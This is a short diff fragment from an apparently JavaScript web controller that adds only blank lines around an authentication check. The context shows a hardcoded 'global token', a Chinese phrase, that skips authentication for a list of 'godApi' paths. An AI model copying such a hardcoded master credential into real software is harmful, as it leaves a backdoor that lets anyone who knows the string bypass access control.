@@ -62,7 +62,9 @@ class baseController {
     let token = params.token;
 
     //如果是全局token，则直接跳过认证
+
     if (token && godApi.indexOf(ctx.path) > -1 ) {
+
     if(token==="我爱中国，我为国家而骄傲"){
       this.$auth = true;
       return
